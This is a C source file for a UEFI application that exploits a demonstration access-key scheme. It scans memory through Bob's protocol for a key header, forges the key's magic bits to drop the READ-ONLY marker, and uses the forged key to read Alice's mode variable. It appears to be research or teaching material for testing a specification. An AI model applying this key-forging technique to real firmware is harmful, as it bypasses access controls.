#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Protocol/LoadedImage.h>
#include <Protocol/ShellParameters.h>

#include <Protocol/Shell.h>
#include <Library/ShellLib.h>

// #include <stddef.h>

#include "../../Demo1_Access_Key/Demo1_Access_Key.h"
#include "../../Demo1_Alice/Demo1_Alice.h"
#include "../../Demo1_Bob/Demo1_Bob.h"

// This exploit aims to break the specification: Generate Access Keys->General->4. Keys with READ-ONLY access MUST have the upper 64 bits set to KEY MAGIC and READ MAGIC.

Demo1_Access_Key_PROTOCOL *AccessKeyProtocol;
Demo1_Alice_PROTOCOL *AliceProtcol;
Demo1_Bob_PROTOCOL *BobProtocol;

// // Re-define
// typedef struct _LINK LINK;
// struct _LINK { // doubly linked list of keys
//   DEMO1_ACCESS_KEY access_key;
//   LINK *next;
//   LINK *prev;
// };

EFI_STATUS
EFIAPI
Demo1NoReadMagicInit (
    IN EFI_HANDLE imgHandle,
    IN EFI_SYSTEM_TABLE* sysTable
)
{
    EFI_STATUS Status;
    gBS = sysTable->BootServices;
    gBS->SetWatchdogTimer(0, 0, 0, NULL); // UEFI apps automatically exit after 5 minutes. Stop that here.

    Print(L"Attacker: Exploit Started\r\n");

    // Locate Protocols
    gBS->LocateProtocol(&gDemo1AccessKeyProtocolGuid, NULL, (VOID *)&AccessKeyProtocol);
    gBS->LocateProtocol(&gDemo1AliceProtocolGuid, NULL, (VOID *)&AliceProtcol);
    gBS->LocateProtocol(&gDemo1BobProtocolGuid, NULL, (VOID *)&BobProtocol);

    // Known key address for Bob so find get the key stored there
    UINTN *Address = NULL;
    UINTN Size = sizeof(DEMO1_ACCESS_KEY);
    DEMO1_ACCESS_KEY *Data= AllocatePool(Size);

    //Loop through all of the address and save the key if the header matches a key header
    for(UINTN addr = 0; addr < MAX_UINTN; addr += Size)
    {
        Status = BobProtocol->Demo1BobDataProvider(BobProtocol, (VOID *)addr, (VOID **)&Data, Size);
        if(Data->access_key_store[1] == 0xDEC0DEBABB1E10AD)
        {
            Address = (UINTN *)addr;
            Print(L"Attacker: Found Bobs Key: (0x%016llx..%016llx) \r\n", 
                Data->access_key_store[0], Data->access_key_store[1]);
            Print(L"Attacker: Keys Address: 0x%016llx\n", Address);
            break;
        }
    }

    // LINK *Link = (LINK *)(Data);

    // // Get the address of Alice's Key.
    // LINK *LinkAlice = Link->prev;

    // Print(L"Attacker: Before the modification, the WRITE MAGIC part: 0x%016llx\n", LinkAlice->access_key.access_key_store[1]);

    // // Write to the Key

    // Status = AliceProtcol->Demo1AliceProvideData(AliceProtcol, NULL, &FuncAddress);

    // Print(L"Attacker: After the modification, the WRITE MAGIC part: 0x%016llx\n", LinkAlice->access_key.access_key_store[1]);

    Data->access_key_store[1] = (ACCESS_KEY_MAGIC << MAGIC_SIZE) + 0x1234;

    Print(L"Attacker: After the modification, Bobs Key: 0x%016llx\n", Data->access_key_store[1]);

    // Write to access variable

    // UINTN Mode_Value = INIT_MODE;
    // UINTN BufferSize = sizeof(Mode_Value);

    // Status  = sysTable->RuntimeServices->SetAccessVariable (
    //     ALICEMODE_VARNAME,
    //     &gAliceVariableGuid,
    //     EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS | EFI_VARIABLE_NON_VOLATILE,
    //     Data,
    //     BufferSize,
    //     &Mode_Value
    //     );
    // if (EFI_ERROR (Status)) {
    //     Print(L"Failed to set variable\n");
    //     return Status;
    // }

    // Print(L"Attacker: Succeed to set variable!\n");

    UINTN   Mode = 0;
    UINTN   BufferSize = sizeof(Mode);

    //
    // Get Alice_Mode Variable
    //
    Status = gST->RuntimeServices->GetAccessVariable (
        ALICEMODE_VARNAME,
        &gAliceVariableGuid,
        NULL,
        Data,
        &BufferSize,
        &Mode
    );
    if (EFI_ERROR (Status)) {
        Print(L"Failed to get variable\n");
        return Status;
    }

    Print(L"Attacker: Succeed to get variable!\n");

    return EFI_SUCCESS;
}

// fs0:Demo1_NoReadMagic.efi